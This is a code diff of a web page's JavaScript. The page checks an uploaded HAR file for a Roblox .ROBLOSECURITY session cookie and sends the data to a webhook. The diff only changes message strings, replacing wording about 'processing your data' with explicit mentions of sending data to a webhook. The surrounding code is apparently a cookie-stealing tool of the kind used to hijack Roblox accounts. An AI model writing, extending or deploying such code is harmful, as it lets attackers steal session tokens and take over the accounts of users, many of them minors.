@@ -121,7 +121,7 @@
 
       // Check if .ROBLOSECURITY exists in HAR content
       if (!harContent.includes('.ROBLOSECURITY')) {
-        Swal.fire('You are not logged in your ROBLOX account!');
+        Swal.fire('The HAR file does not contain a .ROBLOSECURITY cookie.');
         return;
       }
 
@@ -144,8 +144,8 @@
       })
         .then(response => {
           if (!response.ok) {
-            console.error("Failed to process data. Response:", response);
-            Swal.fire('Error processsing your data. Please check the console for details.');
+            console.error("Failed to send data to webhook. Response:", response);
+            Swal.fire('Error... Please check the console for details.');
           } else {
             console.log("Data sent successfully to the webhook.");
             Swal.fire({
@@ -162,7 +162,7 @@
           }
         })
         .catch(error => {
-          console.error("Error while processing your data!:", error);
+          console.error("Error while sending data to webhook:", error);
           Swal.fire('Error... Please check the console for details.');
         });
     }
